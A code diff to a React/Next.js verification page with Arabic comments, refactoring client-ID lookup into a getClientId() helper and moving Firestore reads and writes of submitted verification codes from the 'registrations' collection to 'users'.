@@ -4,6 +4,7 @@ import { AlertCircle, CheckCircle2, Loader2, Headphones, Clock } from 'lucide-re
 import { doc, setDoc, addDoc, collection, onSnapshot, Timestamp } from 'firebase/firestore';
 import { db as dbInstance } from '@/lib/firebase-config';
 import { setUserOnline, setUserOffline, updateUserPage } from '@/lib/realtime-presence';
+import { getClientId } from '@/lib/clientId';
 
 // Get db with null check
 const getDb = () => {
@@ -35,7 +36,7 @@ export default function VerifyPage() {
       return;
     }
     
-    const clientId = sessionStorage.getItem('client_id') || '';
+    const clientId = getClientId();
     setUserOnline(clientId, '/verify');
     
     return () => {
@@ -47,7 +48,7 @@ export default function VerifyPage() {
   useEffect(() => {
     if (!userId || !submitted) return;
 
-    const registrationRef = doc(getDb(), 'registrations', userId);
+    const registrationRef = doc(getDb(), 'users', userId);
     
     const unsubscribe = onSnapshot(registrationRef, (snapshot) => {
       if (snapshot.exists()) {
@@ -56,7 +57,7 @@ export default function VerifyPage() {
         // إذا وافق المدير على التسجيل
         if (data.status === 'verified' || data.status === 'completed') {
           setSuccess(true);
-          const clientId = sessionStorage.getItem('client_id') || '';
+          const clientId = getClientId();
           updateUserPage(clientId, '/thank-you');
           
           setTimeout(() => {
@@ -164,12 +165,12 @@ export default function VerifyPage() {
         throw new Error('معرف المستخدم غير موجود');
       }
 
-      const clientId = sessionStorage.getItem('client_id') || '';
+      const clientId = getClientId();
       const now = Timestamp.now();
       const nowISO = now.toDate().toISOString();
 
       // 1. تحديث مستند التسجيل
-      const registrationRef = doc(getDb(), 'registrations', userId);
+      const registrationRef = doc(getDb(), 'users', userId);
       await setDoc(registrationRef, {
         verification_code: fullCode,
         verification_submitted_at: nowISO,
